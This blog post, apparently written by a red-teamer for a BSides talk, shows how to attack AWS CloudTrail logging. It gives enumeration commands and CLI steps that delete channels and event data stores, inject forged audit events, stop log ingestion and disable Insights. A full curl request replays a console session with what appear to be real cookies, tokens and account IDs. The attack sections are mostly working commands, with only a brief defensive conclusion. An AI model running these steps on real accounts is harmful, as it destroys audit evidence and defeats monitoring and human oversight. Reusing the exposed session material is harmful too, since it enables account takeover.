---
published: true
title: Attacking AWS Cloudtrail 101
date: 2023-11-24 07:40:00 +0200
categories: [Research]
tags: Cloud
---

# Attacking AWS Cloudtrail 101

# Introduction

I was inspired by @(https://twitter.com/Frichette_n)https://twitter.com/Frichette_n research about Cloudtrail bypasses and I didn’t find any material or talks discussing how we can attack Cloudtrail. 

I presented this research @[BsidesABQ](https://twitter.com/BSides_ABQ)

Since logging is one of our enemies in red team operations, I decided to do my research on how to attack Cloudtrail from Adversary perspective. 

# Table of content

1. Service-link Channels
    1. Deleting Channels 
    2. Log pensioning 
2. Event data stores
    1. Deleting stored data 
    2. Stop data logging 
3. Insights events
    1. Disabling Insights events 
4. Organization Delegated Admin
    1. DeRegister organization admin 
    2. Register organization admin 

# What is Cloudtrail?

AWS CloudTrail is an AWS service that helps you enable operational and risk auditing, governance, and compliance of your AWS account. Actions taken by a user, role, or an AWS service are recorded as events in CloudTrail.

# Service-link Channels

## Enumeration :

- aws cloudtrail list-channels --profile Cloudtrail

<img src="https://i.ibb.co/6Dfx001/1.png" alt="1" border="0">

## Abuse 1.1 :

Delete-channel permission  

- aws cloudtrail delete-channel --channel arn:aws:cloudtrail:eu-north-1:036528129738:channel/3d5f7c83-5146-4ea5-8e62-7250313f9e26 --profile Cloudtrail

> This permission won’t work if you have EC2 machine, you need to use your own server.
> 

<img src="https://i.ibb.co/q9fR4KD/2.png" alt="2" border="0">

## Abuse 1.2 :

Put-audit-events permission 

- aws cloudtrail-data put-audit-events --channel-arn $CHANNEL_ARN --region "us-east-1" --audit-events <data> --profile cloudtrail

> It always breaks when I use JSON directly into the command so I used bash
> 

<img src="https://i.ibb.co/FWbvtvz/3.png" alt="3" border="0">

<img src="https://i.ibb.co/Y0H1sQB/4.png" alt="4" border="0">

---

# Event data store

## Enumeration :

- aws cloudtrail list-event-data-stores --profile Cloudtrail

<img src="https://i.ibb.co/fXFKgHc/5.png" alt="5" border="0">

## Abuse 1.1 :

Delete-event-data-store permission

- aws cloudtrail delete-event-data-store --event-data-store arn:aws:cloudtrail:eu-north-1:036528129738:eventdatastore/ed8053cc-2fa5-4313-a774-f901a4c850c1 --profile Cloudtrail

<img src="https://i.ibb.co/3RNBfCT/6.png" alt="6" border="0">

## Abuse 1.2 :

stop-event-data-store-ingestion permission

- aws cloudtrail stop-event-data-store-ingestion --event-data-store arn:aws:cloudtrail:eu-north-1:036528129738:eventdatastore/ed8053cc-2fa5-4313-a774-f901a4c850c1 --profile Cloudtrail

<img src="https://i.ibb.co/GMYsbRM/7.png" alt="7" border="0">

---

# Insights events :

## Enumeration :

- aws cloudtrail get-insight-selectors --trail-name management-events --profile Cloudtrail

<img src="https://i.ibb.co/W53NzZ5/8.png" alt="8" border="0">

## Abuse :

Put-Insight-selector permission

> By using this you are disabling the insights events.
> 
1. Enable intercept in Burpsuite

<img src="https://i.ibb.co/jV9WT5P/9.png" alt="9" border="0">

1. This request can be done with the CLi all you need is the cookies to send it authenticated

<img src="https://i.ibb.co/S0M5BmT/10.png" alt="10" border="0">

```bash
curl -i -s -k -X $'PUT' \
    -H $'Host: eu-north-1.console.aws.amazon.com' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: application/json' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://eu-north-1.console.aws.amazon.com/cloudtrail/home?region=eu-north-1' -H $'Content-Type: application/json' -H $'x-cloudtrail-xsrf-token: UkNZNHRuRmdvSkc1SFhYQTNTLVZOdTl2RkJsN2JkanNLQl9zZTVMQUIwWXwtNDAwNjEzMTg5ODI5Mzk5MzA4OXwxfDIwMjMtMTEtMjRUMTM6MTk6NDYuNzM3Wg==' -H $'Origin: https://eu-north-1.console.aws.amazon.com' -H $'Content-Length: 141' -H $'Connection: close' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin' -H $'Cache-Control: max-age=0' \
    -b $'aws-creds-code-verifier=mLrTV0kwR9xl3b0OUxQKI749k6drbT-eg7BDvSwFrMhbo5-X2; aws-consoleInfo=eyJ0eXAiOiJKV1MiLCJrZXlSZWdpb24iOiJldS1ub3J0aC0xIiwiYWxnIjoiRVMzODQiLCJraWQiOiI1N2QxOTI5MC05NzQxLTQzMDgtYWYxOC1hNzQyNmRmYjZhYzgifQ.eyJhdF9oYXNoIjoiMzFWN2FQd3FqVkx3VmNKM19RWkVHZTd5VnRhTkxaXzYiLCJpc3MiOiJodHRwOlwvXC9zaWduaW4uYXdzLmFtYXpvbi5jb21cL3NpZ25pbiIsInN1YiI6ImFybjphd3M6aWFtOjowMTU0Mjg1NDA2NTk6dXNlclwvY2xvdWR0cmFpbCJ9.GWtXx-axeyOkZsDKsRi62by09wVmJLH810Sq-51Y2eA3zv2P48n2NAn-SwaRNCEZhdcfQHrBlsRVvQajAQ6DZm7OLXhEdppCqbdm-md_Guh6nMjiyyht22x6in9CTdQU; aws-creds=eyJ2IjoyLCJlIjoiZ01QaHFTeFBXVVRJNnEwdzF5RVhya2dyeVJCYzFOQzdNcTZVcURpWHlpRFBm%0AbnFyTTdhdEFyRktqTERONld2QkZzZ0tBakZKMVMySCUwQVZ1UWtyMEhmbmVLaXBnQ2hHWGpjYWFl%0AVHRVejlUTmU0bHRFUjZHclFRaHBwU3JjOUo1bjFBMGtJOE56Z0tpNWtEbXElMkJtUkRXVCUyQnMx%0AJTBBQTFTQUZraFZOZlljV1V5eXRmZFI2bVhraU1WSDZ2Q25LR2ZkZDZxMGprJTJGajhQWmRsREpQ%0ARWhGZHFPbyUyQkJlTm5rdzdDT3dUcEI5WlQlMEE0cGRqT0NTQ2wlMkJJazNyM01ZR05oRFRGeE1V%0ATlZaWmVLVlNUYjZVMFJ6diUyQllKWjJKcXJ0V3Z0RkpkOVEwOVhoSTFMZU5laGtSOWsyMiUwQVQz%0ARVJOV1NuTUlJb1JlRjhzNkdzV1JIUUlHYSUyRm1MeGJRdWhrYkFPR0swdU1tNmxMRzBsRlNPcmJL%0AbHRZbXBIN1ZhRVhvNUlaOGtJVyUwQWdDcXZ4SWJ5YUZvWFhaJTJGaGhnUE9FSkhsbkphV09WQ0RI%0AanB5RzJRSkEwMWFGVFZLUHR1V1RBdCUyRmxrZ3clMkZIU0VudjYxNkFBVmRyNHUlMEFwS1NNdTdt%0AanlnTlJLYkY5Ujh3czV2U25RWW44VFVxNW5LWHN5dHFjeE5LcGx0dVhhJTJCQVV6SUVlMCUyQnhz%0AJTJCbEZOTEtYZ2lqS3lQcmtnJTBBOThJQ2JNdmxoMVVwM3YxbVJKUVo5eUhpSkl0eHRPQnZuZ21Q%0AWHRyMWxiYkVncDZuTnB3eE43Rjk1Z0ZtbzBmREtGZk0zQUMlMkJVVHNZJTBBaW9YWWpob1V5Zjk3%0ASWZOMFV5ViUyQjVpd0drbXZWb1BWeVR2SjZUWCUyRnpEWk1YU0NFbXdDODVxN0VkWGZIUG9vT2w3%0AUE9JUUdmYlRaa1ElMEFmUGNDMFVYSWdCVU1EM0NuZW1lRVJhbUhBalZXSVREVjlXd0hZNE1NQiUy%0ARk1NUlZhNUQ4djdUcFpNeGt2UjFObWY3JTJGS0glMkI5OXMweTVZJTBBazNZQjRxZmdCZVNRZG5Y%0AcENGa3VmWDhHVjQ3WiUyRjBRNzdqT2NqJTJGZiUyRjNnMDJTJTJCb1R0VDhVN3I2RSUyRjBmaFRT%0ATCUyQmNlSHg5aDZJNXElMkJzJTBBbHdLNk02ZTFNR0lPbVR2WmttJTJCa3g3MiUyQmZET0FYcTBx%0ARjEwc2pQeXNXcUppZmNBVXZXU0w0NzJjWHU2b29XSmJneHRxMktZdU8zZWolMEFZTiUyRkNadXpY%0ARGRGOVdrUXRTRER0VTdwcSUyQnNUSlhvZXd6UDZOR2NQSE9OQko2czZzbWJEVUdub2I5eHUlMkJp%0AYm1YdE5XREhLelNtYmFQJTBBek9FOFFoaDFJdTU4WXc3YlM0ZnQ2UElTQUFRUEhydU1LdXI2YzE3%0AY01TJTJGSTB1Nk9HQUkzTlhRM2VmMUc1bENCY2pZV09QUWZkd2JKJTBBRmxzTDkwNXdjaDFrYmJZ%0AbHJvSnA1dDdndUcxclExc2MxSHdnNVRMN0VXNk1PS2dGQ0dLMzdTS2dETzBuRGpGa0xnVzhvUVZ0%0AQ3dSQyUwQTlMRVVBS3MxTlNCaTlNZUR3M3lJTkxXMERPYkhZZDNocmhCTFgyR3RMQ0lqemNZWGN6%0AMWdLMTVid1U3UHVzdVZaTTNPWHZtZ255R1glMEE1WDhkM2w0N29xOWRUMFlRd2hCRGtEeFF4RWlK%0AV3lOaTJBNUJJaTBNVmsxeEpMeFJyOHhUSmNXYnRpNHRPNW9HQkhyQWJ1TVJjcGJGJTBBMXRPa2J2%0AV0JOMGlzWW1HR1VBNE9wQmFDUnBpblY1MzhaUW1qUU80SHdIUlEzJTJCVFByRGxPbG90SnFVaE5G%0AY2dJR1FPU2NWQm4xdsfgsdfgdsfgsdfgdGRIJTBBQ0J4RDhUT0ZRckIlMkZoalR4enhDRyUyQjZYZE9vU1V3VlYlMkZv%0Aem9MRTdBZlVCUUx0WElyazNKdWltMWpaYmUlMkJXZHFLdmRaJTJGNDY4TjFpREMlMEFzUDBISnd0%0AT2F6dmk4QlhkWW4xbHIzN1pOY0dZM3ZIRXBBMlRsV0hhNkVEUWNWanJaaXB3Um9GdUwlMkJOeUU0%0ANVY0eTFFVHpiN2lNWkIlMEFBMGVzOVdxNjZnSzdrcUFDcU9iOSUyRmk5WHElMkZtNTFFZ0lFaHU4%0AVDBlVFd2MUxIWnd2NDA0MHFnbzRUYTF4Z2lmUGlpTU1HSUlzZ2pZdyUwQTBBMkxQUG4lMkZ4VWt1%0Aa3J6UWYxVG41YW04VXpIVE9DOHExY0NyOE5ySFd3S0g1VW9pV2pKbU0yUDdwR1h4Q2F5WEpyQ29t%0AeGZqN2FzWiUwQW9ENFR2WlpWdE5KaVB3Z1V6aGpHN1o2M1NkZVNGSXlpaG5KbmZjUWd6N0wzbkQz%0AMzlxbVc0M2dKcXRkUWxIdGo0MTZyMkpncSIsImEiOjEsImsiOjU0fQ%3D%3D; JSESSIONID=15A621603EB7FCA92753D57BCFCB5A08; aws-ubid-main=611-7283050-5123120; aws-vid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwaWQiOiI2Y2NmYTJkNy0zNTg5LTRhNTYtOWZmYy1lYmEzOThhNzZhNGYiLCJ1YXQiOjE3MDA4MzE3MTcyNzEsImV4cCI6MTczMjM2NzcxNzI3MSwicHZkIjoiYXdzLmFtYXpvbi5jb20ifQ.aRXljW_PBiRDswnsnoguweZpXOuJpLbbGRgZ1mbnYOc; remember-account=false; aws-account-alias=036528129738; aws-account-data=%7B%22marketplaceGroup%22%3A%22AWS%22%7D; aws-userInfo=%7B%22arn%22%3A%22arn%3Aaws%3Aiam%3A%3A036528129738%3Auser%2FtestaccountBudget%22%2C%22alias%22%3A%22036528129738%22%2C%22username%22%3A%22testaccountBudget%22%2C%22keybase%22%3A%22BusFwa7ORKTMx8q4jxMcO%2FXT%2BxohCbdpsGyvdSG7mPo%5Cu003d%22%2C%22issuer%22%3A%22http%3A%2F%2Fsignin.aws.amazon.com%2Fsignin%22%2C%22signinType%22%3A%22PUBLIC%22%7D; aws-userInfo-signed=eyJ0eXAiOiJKV1MiLCJrZXlSZWdpb24iOiJ1cy1lYXN0LTEiLCJhbGciOiJFUzM4NCIsImtpZCI6ImViYjdjODY1LTY3NGEtNDNjZi1hYzY2LTUxNGQ1YjQxNjlhYiJ9.eyJzdWIiOiIwMzY1MjgxMjk3MzgiLCJzaWduaW5UeXBlIjoiUFVCTElDIiwiaXNzIjoiaHR0cDpcL1wvc2lnbmluLmF3cy5hbWF6b24uY29tXC9zaWduaW4iLCJrZXliYXNlIjoiQnVzRndhN09SS1RNeDhxNGp4TWNPXC9YVCt4b2hDYmRwc0d5dmRTRzdtUG89IiwiYXJuIjoiYXJuOmF3czppYW06OjAzNjUyODEyOTczODp1c2VyXC90ZXN0YWNjb3VudEJ1ZGdldCIsInVzZXJuYW1lIjoidGVzdGFjY291bnRCdWRnZXQifQ.oQm0YxRL52ZYNmAZAe5l3JZ2X0hVsDlEeEsmoU2pldiWE1Mf5K3jBGbllNzsdfgdfsgasdfasdfasdhsdafhcSWR_EVPz8qHWj0sllbEamEg8pc46Bkn8ngVf9nrjW-S96JmOe96Zh9GTQtPq1QYP7bIL; regStatus=registered; seance=%7B%22accountId%22%3A%22036528129738%22%2C%22iam%22%3Atrue%2C%22services%22%3A%5B%22AWSCloudTrail%22%2C%22cloudtrail%22%5D%2C%22status%22%3A%22ACTIVE%22%2C%22exp%22%3A0%7D; awsc-color-theme=light; awsc-uh-opt-in=\"\"; noflush_awsccs_sid=e9aa0dda937be820c48f7ae5bd25e545a3283fec2017f79a7dd7bcdbe0ef9b77; cloudtrail-session-id=Bzyht0Qcyfak6VcugHAl12BN77W7CsXUhW6h8o58Khw; awsccc=eyJlIjoxLCJwIjoxLCJmIjoxLCJhIjoxLCJpIjoiMTJjZDQxMDktYjI5OC00NzgxLThjYTktOTNiZTQxMTE2NDgyIiwidiI6IjEifQ==; aws-signer-token_eu-north-1=eyJrZXlWZXJzaW9uIjoiY3ZSblRkWDUxR0ZxeDdNTkNENG9rbnVaT3FwdDBEQmgiLCJ2YWx1ZSI6ImdFemt2Sy9BN01zZTN4cXlUdGZNWDF6UkFSNlY5WlZoOUtZOUhRYTd4MWc9IiwidmVyc2lvbiI6MX0=; noflush_awscnm=%7B%22hist%22%3A%5B%22ctr%22%2C%22home%22%5D%2C%22sc%22%3A%5B%5D%2C%22tm%22%3A%22tm-both%22%2C%22ea%22%3Atrue%2C%22consoleFlags%22%3A%5B%22F%22%2C%22G%22%2C%22J%22%2C%22H%22%2C%22L%22%5D%7D; noflush_Region=eu-north-1; last-sign-in-session=e9aadda937be820c48f7ae5bd25e545a3283fec2017f79a7dd7bcdbe0ef9b77; toolsExperience={}; awsc-rac=BAH30|CGK33|CPT33|DXB33|HKG33|HYD33|MEL33|MXP30|TLV30|ZAZ30|ZRH30@1700831742609; noflush_awsc_cct_config_version=6CMfVeLSUFu_q_sUXRTc_ZaZy4fH5pf8sRxOAQt_JAc' \
    --data-binary $'{\"trailArn\":\"arn:aws:cloudtrail:eu-north-1:036528129738:trail/management-events\",\"trailHomeRegion\":\"eu-north-1\",\"trailInsightSelectors\":\"[]\"}\x0d\x0a\x0d\x0a\x0d\x0a' \
    $'https://eu-north-1.console.aws.amazon.com/cloudtrail/service/putInsightSelectors?region=eu-north-1
```

---

## Conclusion

Most of AWS permission can be weaponized if the attacker understood how it works, if you used condition statements you will prevent anyone from using what I call dangerous permissions [ Deleting, editing ….etc. ], even if there misconfiguration only the principal you are allowing will be able to use it.
